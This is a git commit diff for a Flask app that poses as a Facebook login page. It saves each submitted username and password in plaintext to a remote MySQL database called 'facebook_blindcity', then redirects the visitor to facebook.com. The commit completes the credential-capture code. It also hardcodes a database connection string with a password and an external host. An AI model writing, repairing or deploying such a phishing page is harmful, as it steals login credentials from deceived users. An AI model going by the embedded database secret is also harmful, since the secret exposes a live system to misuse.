413ceaa8f526c70481e11df7a5ce7efca20e9422
janiyasir <janiyasir989@gmail.com>
2024-06-28 05:56:18 +0500

    Your commit message here

--- my_flask_app/app.py
+++ my_flask_app/app.py
@@ -5,16 +5,16 @@ app = Flask(__name__)
 
 # Replace with your database URI
 app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://facebook_blindcity:59257e84d141d92bd5434c4f9c800c6ea897ef0f@cxr.h.filess.io:3307/facebook_blindcity'
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False  # Disable modification tracking
 
 db = SQLAlchemy(app)
 
 class User(db.Model):
-    
+    __tablename__ = 'users'  # Specify the table name
+
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(50), unique=True, nullable=False)
     password = db.Column(db.String(100), nullable=False)
-
-    
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
@@ -22,16 +22,18 @@ def login():
         username = request.form['username']
         password = request.form['password']
 
-        # Save to database
-        
-        db.session.add()
+        # Create a new User instance
+        new_user = User(username=username, password=password)
+
+        # Add the new user to the database session
+        db.session.add(new_user)
         db.session.commit()
 
-        # Redirect to facebook.com
+        # Redirect to facebook.com after saving user data
         return redirect('https://www.facebook.com')
 
     return render_template('login.html')
 
 if __name__ == '__main__':
-    db.create_all()
+    db.create_all()  # Create database tables based on defined models
     app.run(debug=True)
